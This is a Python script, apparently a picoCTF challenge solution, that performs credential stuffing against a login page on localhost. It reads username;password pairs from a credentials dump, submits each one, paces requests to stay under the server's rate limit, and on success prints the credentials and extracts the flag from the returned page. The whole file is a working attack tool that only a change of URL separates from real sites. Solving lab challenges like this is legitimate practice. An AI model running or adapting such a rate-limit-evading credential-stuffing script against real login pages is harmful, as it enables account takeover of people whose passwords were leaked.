
import requests
import time
import re
from urllib.parse import urlparse
import time

## Endpoints
BASE_URL = "http://localhost:32769"    ## Chane to the given URL
LOGIN_ENDPOINT = "/login"

debug = False

def d_print(*args, **kwargs):
    if debug:
        print(*args, **kwargs)


def post_request(endpoint: str, data: dict):
    url = f"{BASE_URL}{endpoint}"
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"Request to {url} failed: {e}")
        exit(1)


def get_request(endpoint, cookies=None):
    url = f"{BASE_URL}{endpoint}"
    try:
        response = requests.get(url, cookies=cookies)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"Request to {url} failed: {e}")
        exit(1)


def main():
    RATE_INTERVAL = 30      # in seconds
    MAX_REQUESTS = 10     # do not set to 0

    new_request_delay = (RATE_INTERVAL / (MAX_REQUESTS * 0.9))   # make less requests that max threshold for safety

    # get credentials dump
    with open("../creds-dump.txt", "r") as file:
        dumplist = [line.strip() for line in file.readlines()]
    # assert credentials dump isnt empty
    if len(dumplist) == 0:
        raise Exception("Creds dump is empty")

    # Guess credentials at a rate below max rate
    print(f"Beginning cred-stuffing, delay between requests set at {new_request_delay} seconds\n")
    start_time = time.time()
    for line in dumplist:
        username, password = line.split(";")
        print("Making request [username: %s, password: %s]" % (username, password))

        login_data = {"username": username, "password":password}
        resp = post_request(LOGIN_ENDPOINT, login_data)
        resp_path = urlparse(resp.url).path                                             # Parse it and get the path
        d_print(f"Response status: {resp.status_code}, response path: {resp_path}")
        d_print(f"Response: {resp.text}")
        
        if resp_path == LOGIN_ENDPOINT:
            d_print("Loggin attempt failed, sleeping for %s...\n" % new_request_delay)
            time.sleep(new_request_delay)
            continue
        else:
            # we found the page
            print("\nSuccessfully logged in! [Username: %s, password: %s]" % (username, password))
            print("Time to find: %s seconds" % (time.time() - start_time))
            html = resp.text
            d_print(f"Homepage:\n{html}\n")
            flag_match = re.search(r"picoCTF\{[a-zA-Z0-9_]+\}", html)
            print(f"Acquired flag:\n{flag_match.group(0)}")
            exit(0)
                

    # If we reached here we failed
    print("Unable to login successfully :(")
        

if __name__ == '__main__':
    main()
